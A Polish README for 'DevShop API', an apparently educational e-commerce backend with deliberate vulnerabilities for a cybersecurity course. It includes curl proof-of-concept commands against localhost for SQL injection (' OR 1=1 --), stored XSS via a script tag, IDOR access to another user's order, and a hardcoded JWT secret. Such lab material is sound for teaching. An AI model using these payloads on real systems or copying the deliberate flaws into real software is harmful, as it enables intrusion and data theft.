# DevShop API - Vulnerable e-Commerce Backend

Projekt edukacyjny na przedmiot o cyberbezpieczeństwie. Backend zawiera celowe luki bezpieczeństwa (SQLi, XSS, IDOR, Hardcoded Secrets, No Rate Limiting).

## Stack Technologiczny
- **Backend:** Node.js + Fastify
- **Język:** TypeScript
- **Baza danych:** PostgreSQL

---

## 🚀 Jak uruchomić projekt

### 1. Instalacja zależności
Wszystkie paczki są instalowane lokalnie:
```bash
npm install
```

### 2. Konfiguracja bazy danych
Upewnij się, że masz działający serwer PostgreSQL. Skopiuj/edytuj dane w pliku `.env`:
```env
DATABASE_URL=postgres://postgres:postgres@localhost:5432/devshop
JWT_SECRET=super-secret-key-123
PORT=3000
```

### 3. Inicjalizacja bazy
Skrypt stworzy tabele i doda dane testowe (seed):
```bash
npm run db:init
```

### 4. Uruchomienie serwera
Tryb deweloperski (hot-reload):
```bash
npm run dev
```

---

## 🛠️ Testowanie podatności (POC)

Poniżej znajdują się komendy `curl` demonstrujące luki w zabezpieczeniach.

### 1. Logowanie (Uzyskanie tokena JWT)
Większość ataków (poza produktami) wymaga bycia zalogowanym.
```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "user@example.com", "password": "password"}' | jq -r .token)
```

### 2. SQL Injection (SQLi)
Endpoint: `GET /api/products?search=`
```bash
# Wyciągnięcie wszystkich rekordów (Bypass)
curl -G "http://localhost:3000/api/products" --data-urlencode "search=' OR 1=1 --"

# Wyciek informacji (Stack Trace) przez błąd składni
curl -G "http://localhost:3000/api/products" --data-urlencode "search='"
```

### 3. Stored XSS
Endpoint: `POST /api/products/:id/reviews`
```bash
# Wstrzyknięcie złośliwego kodu
curl -X POST http://localhost:3000/api/products/1/reviews \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"content": "<script>alert(\"XSS\")</script>"}'

# Weryfikacja (kod wraca niefiltrowany)
curl http://localhost:3000/api/products/1/reviews
```

### 4. IDOR (Insecure Direct Object Reference)
Endpoint: `GET /api/orders/:id`
```bash
# Próba odczytu zamówienia innego użytkownika (ID: 1 należy do admina)
curl -X GET http://localhost:3000/api/orders/1 \
  -H "Authorization: Bearer $TOKEN"
```

### 5. Brak Rate Limitingu (Brute-force)
Możesz wysyłać nieskończoną ilość zapytań na `/api/auth/login` bez blokady IP.

### 6. Hardcoded Secrets
Klucz API do płatności jest wpisany na sztywno w pliku `src/routes/orders.ts`. Można to zaobserwować w logach serwera po złożeniu zamówienia:
```bash
curl -X POST http://localhost:3000/api/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_ids": [1]}'
```
